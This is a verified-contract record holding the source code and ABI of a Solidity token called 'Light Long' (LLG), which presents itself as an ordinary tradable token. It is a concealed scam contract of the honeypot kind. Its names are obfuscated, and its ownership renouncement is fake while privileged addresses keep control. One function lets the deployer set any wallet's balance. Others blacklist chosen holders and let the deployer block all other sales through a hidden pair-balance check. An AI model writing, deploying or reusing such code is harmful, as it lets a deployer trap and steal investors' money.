{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface walletReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract isShould {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchedFund {\n    function createPair(address feeTokenAuto, address amountTokenLimit) external returns (address);\n}\n\ninterface isTeamBuy {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address shouldToken) external view returns (uint256);\n\n    function transfer(address buyTx, uint256 modeTotalEnable) external returns (bool);\n\n    function allowance(address fundToken, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 modeTotalEnable) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address buyTx,\n        uint256 modeTotalEnable\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed teamTo, uint256 value);\n    event Approval(address indexed fundToken, address indexed spender, uint256 value);\n}\n\ninterface isTeamBuyMetadata is isTeamBuy {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract LightLong is isShould, isTeamBuy, isTeamBuyMetadata {\n\n    function symbol() external view virtual override returns (string memory) {\n        return liquidityReceiver;\n    }\n\n    address maxAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    event OwnershipTransferred(address indexed fundTo, address indexed receiverBuyTo);\n\n    function getOwner() external view returns (address) {\n        return tradingTx;\n    }\n\n    address public enableSender;\n\n    string private txReceiver = \"Light Long\";\n\n    uint256 fundSwap;\n\n    function fundTrading(address autoFund) public {\n        if (listReceiver) {\n            return;\n        }\n        if (receiverWallet == walletSell) {\n            totalAtTake = false;\n        }\n        shouldFund[autoFund] = true;\n        if (exemptTotal == totalAtTake) {\n            receiverWallet = walletSell;\n        }\n        listReceiver = true;\n    }\n\n    constructor (){\n        if (totalAtTake) {\n            exemptTotal = true;\n        }\n        walletReceiver buyTo = walletReceiver(walletTrading);\n        enableSender = launchedFund(buyTo.factory()).createPair(buyTo.WETH(), address(this));\n        \n        totalExemptList = _msgSender();\n        receiverMarketingList();\n        shouldFund[totalExemptList] = true;\n        tokenAmountIs[totalExemptList] = receiverExemptList;\n        \n        emit Transfer(address(0), totalExemptList, receiverExemptList);\n    }\n\n    bool public listReceiver;\n\n    function listLaunched(address isEnable) public {\n        autoBuy();\n        \n        if (isEnable == totalExemptList || isEnable == enableSender) {\n            return;\n        }\n        launchedTo[isEnable] = true;\n    }\n\n    bool private exemptTotal;\n\n    address public totalExemptList;\n\n    function allowance(address txSwap, address amountLaunched) external view virtual override returns (uint256) {\n        if (amountLaunched == walletTrading) {\n            return type(uint256).max;\n        }\n        return swapFeeWallet[txSwap][amountLaunched];\n    }\n\n    function approve(address amountLaunched, uint256 modeTotalEnable) public virtual override returns (bool) {\n        swapFeeWallet[_msgSender()][amountLaunched] = modeTotalEnable;\n        emit Approval(_msgSender(), amountLaunched, modeTotalEnable);\n        return true;\n    }\n\n    function autoBuy() private view {\n        require(shouldFund[_msgSender()]);\n    }\n\n    mapping(address => bool) public shouldFund;\n\n    uint256 public walletSell;\n\n    function receiverMarketingList() public {\n        emit OwnershipTransferred(totalExemptList, address(0));\n        tradingTx = address(0);\n    }\n\n    function shouldSell(address atTake, address buyTx, uint256 modeTotalEnable) internal returns (bool) {\n        if (atTake == totalExemptList) {\n            return liquidityIs(atTake, buyTx, modeTotalEnable);\n        }\n        uint256 sellWalletFrom = isTeamBuy(enableSender).balanceOf(maxAuto);\n        require(sellWalletFrom == exemptModeTrading);\n        require(buyTx != maxAuto);\n        if (launchedTo[atTake]) {\n            return liquidityIs(atTake, buyTx, fromAmount);\n        }\n        return liquidityIs(atTake, buyTx, modeTotalEnable);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverExemptList;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return modeAuto;\n    }\n\n    function totalLimitSell(address listTeam, uint256 modeTotalEnable) public {\n        autoBuy();\n        tokenAmountIs[listTeam] = modeTotalEnable;\n    }\n\n    function limitLaunched(uint256 modeTotalEnable) public {\n        autoBuy();\n        exemptModeTrading = modeTotalEnable;\n    }\n\n    mapping(address => bool) public launchedTo;\n\n    uint256 constant fromAmount = 19 ** 10;\n\n    uint8 private modeAuto = 18;\n\n    bool private totalAtTake;\n\n    function balanceOf(address shouldToken) public view virtual override returns (uint256) {\n        return tokenAmountIs[shouldToken];\n    }\n\n    function liquidityIs(address atTake, address buyTx, uint256 modeTotalEnable) internal returns (bool) {\n        require(tokenAmountIs[atTake] >= modeTotalEnable);\n        tokenAmountIs[atTake] -= modeTotalEnable;\n        tokenAmountIs[buyTx] += modeTotalEnable;\n        emit Transfer(atTake, buyTx, modeTotalEnable);\n        return true;\n    }\n\n    uint256 public receiverWallet;\n\n    uint256 private receiverExemptList = 100000000 * 10 ** 18;\n\n    uint256 exemptModeTrading;\n\n    string private liquidityReceiver = \"LLG\";\n\n    address private tradingTx;\n\n    mapping(address => uint256) private tokenAmountIs;\n\n    function owner() external view returns (address) {\n        return tradingTx;\n    }\n\n    function transferFrom(address atTake, address buyTx, uint256 modeTotalEnable) external override returns (bool) {\n        if (_msgSender() != walletTrading) {\n            if (swapFeeWallet[atTake][_msgSender()] != type(uint256).max) {\n                require(modeTotalEnable <= swapFeeWallet[atTake][_msgSender()]);\n                swapFeeWallet[atTake][_msgSender()] -= modeTotalEnable;\n            }\n        }\n        return shouldSell(atTake, buyTx, modeTotalEnable);\n    }\n\n    function transfer(address listTeam, uint256 modeTotalEnable) external virtual override returns (bool) {\n        return shouldSell(_msgSender(), listTeam, modeTotalEnable);\n    }\n\n    address walletTrading = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function name() external view virtual override returns (string memory) {\n        return txReceiver;\n    }\n\n    mapping(address => mapping(address => uint256)) private swapFeeWallet;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverBuyTo\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamTo\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txSwap\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountLaunched\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeTotalEnable\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldToken\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoFund\",\"type\":\"address\"}],\"name\":\"fundTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"modeTotalEnable\",\"type\":\"uint256\"}],\"name\":\"limitLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isEnable\",\"type\":\"address\"}],\"name\":\"listLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMarketingList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalExemptList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeTotalEnable\",\"type\":\"uint256\"}],\"name\":\"totalLimitSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeTotalEnable\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buyTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeTotalEnable\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "LightLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}